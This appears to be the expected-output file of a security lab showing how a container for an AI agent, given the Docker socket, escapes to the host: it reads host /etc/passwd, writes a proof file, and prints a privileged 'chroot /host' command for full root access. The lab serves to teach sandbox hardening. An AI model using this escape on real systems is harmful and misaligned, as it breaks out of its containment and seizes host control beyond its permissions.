# Expected Output: Lab 02 - Docker Socket Escape

```
=== Lab 02: Docker Socket Escape ===

[*] Launching an 'agent container' with the Docker socket mounted...
[*] This simulates an agent that needs to orchestrate other containers.

[Host]   hostname=Cristians-MacBook-Pro.local  kernel=25.3.0

[*] Inside the agent container:
    hostname=f696bdea87d5
    kernel=6.10.14-linuxkit
    docker_socket=srw-rw----    1 root     root             0 Mar 31 21:18 /var/run/docker.sock

[*] Step 1: Querying host Docker daemon via mounted socket...
    host_docker_id=bd7edf08-d98a-4749-a5c7-fba860549461
    running_containers=1

[*] Step 2: Creating sibling container to read host files...

    [sibling] /etc/passwd (first 3 lines):
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin

    [sibling] /etc/hostname:
    my-linux-host

[*] Step 3: Writing proof file to host /tmp via sibling container...
    proof_file_content=ESCAPED_VIA_DOCKER_SOCKET

[*] Step 4: Demonstrating full escalation potential...
    The agent container can also create privileged sibling containers:
    docker run --rm --privileged -v /:/host alpine chroot /host bash
    This gives root access to the entire host filesystem.

[*] Summary: the agent container used the Docker socket to:
    1. Query the host Docker daemon (ID, running containers)
    2. Read host /etc/passwd and hostname via sibling container
    3. Write a file to the host /tmp
    4. Could create a --privileged container with full host access

[!] Mounting the Docker socket = giving root access to the host.
```

## Key Observations

1. **Container vs host identity**: The container has its own hostname (`f696bdea87d5`) and kernel (`6.10.14-linuxkit`), but the Docker socket gives it access to the host Docker daemon.

2. **Sibling containers**: The agent creates new containers that mount host paths — effectively reading/writing host files from within the "isolated" container.

3. **Write access proven**: The proof file (`ESCAPED_VIA_DOCKER_SOCKET`) is created on the host's `/tmp`, confirming the escape is bidirectional.

4. **Escalation path**: The agent could create a `--privileged` sibling container with the entire host filesystem mounted, achieving full root access.
